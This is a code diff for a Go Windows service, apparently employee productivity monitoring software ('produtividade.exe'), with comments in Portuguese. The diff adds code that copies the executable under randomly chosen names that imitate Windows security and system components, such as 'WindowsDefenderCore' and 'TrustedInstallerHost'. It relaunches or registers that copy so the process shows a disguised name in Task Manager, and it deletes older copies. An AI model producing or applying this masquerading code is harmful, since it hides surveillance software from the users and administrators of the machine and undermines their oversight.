@@ -6,6 +6,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"log"
+	"math/rand"
 	"os"
 	"os/exec"
 	"os/user"
@@ -41,6 +42,127 @@ func hiddenCmd(name string, args ...string) *exec.Cmd {
 		CreationFlags: 0x08000000, // CREATE_NO_WINDOW
 	}
 	return cmd
+}
+
+// processNames é a lista fixa de nomes usados para disfarçar o processo
+// no Gerenciador de Tarefas. A cada execução do exe original é escolhido
+// um nome aleatório desta lista e o executável é copiado com esse nome,
+// para que o processo visível no Task Manager tenha um nome genérico.
+var processNames = []string{
+	"SystemHostService",
+	"WindowsDefenderCore",
+	"NetCfgHelper",
+	"AudioDriverHost",
+	"PrintSpoolerAgent",
+	"SecurityHealthBroker",
+	"DeviceAssociationSvc",
+	"TrustedInstallerHost",
+	"WinDiagnosticsHost",
+	"UserSessionManager",
+}
+
+var processRand = rand.New(rand.NewSource(time.Now().UnixNano()))
+
+// pickRandomProcessName escolhe um nome aleatório da lista fixa.
+func pickRandomProcessName() string {
+	return processNames[processRand.Intn(len(processNames))]
+}
+
+// isDisguisedExeName retorna true quando o nome do arquivo (com ou sem .exe)
+// corresponde a um dos nomes da lista de disfarce.
+func isDisguisedExeName(name string) bool {
+	base := strings.ToLower(strings.TrimSuffix(name, ".exe"))
+	for _, n := range processNames {
+		if base == strings.ToLower(n) {
+			return true
+		}
+	}
+	return false
+}
+
+// cleanupOldDisguisedCopies remove cópias disfarçadas antigas no diretório
+// do executável, preservando apenas keepPath.
+func cleanupOldDisguisedCopies(dir, keepPath string) {
+	keepBase := strings.ToLower(filepath.Base(keepPath))
+	for _, n := range processNames {
+		p := filepath.Join(dir, n+".exe")
+		if strings.ToLower(filepath.Base(p)) == keepBase {
+			continue
+		}
+		if _, err := os.Stat(p); err == nil {
+			_ = os.Remove(p)
+		}
+	}
+}
+
+// createDisguisedCopy copia o executável atual para o mesmo diretório usando
+// um nome aleatório da lista processNames, remove cópias antigas e retorna o
+// caminho do novo arquivo. O arquivo original (produtividade.exe) é mantido.
+func createDisguisedCopy() (string, error) {
+	exePath, err := os.Executable()
+	if err != nil {
+		return "", err
+	}
+	dir := filepath.Dir(exePath)
+
+	var dest string
+	for i := 0; i < 10; i++ {
+		candidate := filepath.Join(dir, pickRandomProcessName()+".exe")
+		if strings.EqualFold(candidate, exePath) {
+			continue
+		}
+		dest = candidate
+		break
+	}
+	if dest == "" {
+		return "", fmt.Errorf("não foi possível gerar nome aleatório distinto do atual")
+	}
+
+	in, err := os.Open(exePath)
+	if err != nil {
+		return "", err
+	}
+	defer in.Close()
+
+	// Se o destino já existir (cópia antiga com mesmo nome sorteado), remove antes
+	_ = os.Remove(dest)
+
+	out, err := os.OpenFile(dest, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0755)
+	if err != nil {
+		return "", err
+	}
+	if _, err := io.Copy(out, in); err != nil {
+		out.Close()
+		os.Remove(dest)
+		return "", err
+	}
+	out.Close()
+
+	cleanupOldDisguisedCopies(dir, dest)
+	return dest, nil
+}
+
+// relaunchAsDisguised cria uma cópia disfarçada do exe atual e a lança como
+// processo filho, passando os mesmos argumentos. Retorna true se conseguiu
+// relançar (o chamador deve então encerrar o processo atual).
+func relaunchAsDisguised() bool {
+	disguised, err := createDisguisedCopy()
+	if err != nil {
+		log.Printf("Aviso: falha ao criar cópia disfarçada (%v); mantendo nome original", err)
+		return false
+	}
+	cmd := exec.Command(disguised, os.Args[1:]...)
+	cmd.Dir = filepath.Dir(disguised)
+	cmd.Stdin = os.Stdin
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	if err := cmd.Start(); err != nil {
+		log.Printf("Aviso: falha ao iniciar processo disfarçado (%v); mantendo nome original", err)
+		return false
+	}
+	fmt.Printf("Processo iniciado como %s (PID %d)\n", filepath.Base(disguised), cmd.Process.Pid)
+	cmd.Process.Release()
+	return true
 }
 
 const (
@@ -287,7 +409,7 @@ func main() {
 			}
 			fmt.Println("Serviço parado com sucesso!")
 		case "run":
-			runDirectly()
+			runDisguisedOrDirect()
 		default:
 			fmt.Printf("Uso: %s [install|remove|start|stop|run]\n", os.Args[0])
 		}
@@ -296,6 +418,22 @@ func main() {
 
 	fmt.Println("Nenhum argumento fornecido. Executando em modo debug...")
 	fmt.Println("Pressione Ctrl+C para sair")
+	runDisguisedOrDirect()
+}
+
+// runDisguisedOrDirect garante que o processo visível no Gerenciador de Tarefas
+// tenha sempre um dos nomes aleatórios da lista processNames. Quando o exe
+// original (produtividade.exe ou qualquer nome fora da lista) é executado
+// diretamente, uma cópia disfarçada é criada e lançada; o processo original
+// encerra em seguida. Se já estivermos rodando sob um nome disfarçado, apenas
+// executa normalmente.
+func runDisguisedOrDirect() {
+	exePath, err := os.Executable()
+	if err == nil && !isDisguisedExeName(filepath.Base(exePath)) {
+		if relaunchAsDisguised() {
+			return
+		}
+	}
 	runDirectly()
 }
 
@@ -6435,9 +6573,16 @@ func (s *service) logError(message string, err error) {
 
 // Funções para gerenciar o serviço do Windows
 func installService() error {
-	exepath, err := os.Executable()
-	if err != nil {
+	if _, err := os.Executable(); err != nil {
 		return err
+	}
+
+	// Cria uma cópia disfarçada do exe com nome aleatório da lista fixa e
+	// registra essa cópia como binário do serviço. O produtividade.exe
+	// original é mantido intacto.
+	servicePath, err := createDisguisedCopy()
+	if err != nil {
+		return fmt.Errorf("erro ao criar cópia disfarçada: %v", err)
 	}
 
 	m, err := mgr.Connect()
@@ -6452,7 +6597,7 @@ func installService() error {
 		return fmt.Errorf("serviço %s já existe", serviceName)
 	}
 
-	s, err = m.CreateService(serviceName, exepath, mgr.Config{
+	s, err = m.CreateService(serviceName, servicePath, mgr.Config{
 		DisplayName: serviceDesc,
 		StartType:   mgr.StartAutomatic,
 	})
@@ -6483,6 +6628,13 @@ func removeService() error {
 	}
 	defer s.Close()
 
+	// Guarda o caminho do binário registrado para poder remover a cópia
+	// disfarçada após o serviço ser removido
+	var disguisedServicePath string
+	if cfg, cfgErr := s.Config(); cfgErr == nil {
+		disguisedServicePath = cfg.BinaryPathName
+	}
+
 	// Primeiro tenta parar o serviço
 	status, err := s.Control(svc.Stop)
 	if err == nil {
@@ -6503,6 +6655,11 @@ func removeService() error {
 	// Remove o serviço
 	if err := s.Delete(); err != nil {
 		return fmt.Errorf("erro ao remover serviço: %v", err)
+	}
+
+	// Apaga a cópia disfarçada usada pelo serviço (se aplicável)
+	if disguisedServicePath != "" && isDisguisedExeName(filepath.Base(disguisedServicePath)) {
+		_ = os.Remove(disguisedServicePath)
 	}
 
 	// 🔑 Garante que o processo atual finalize
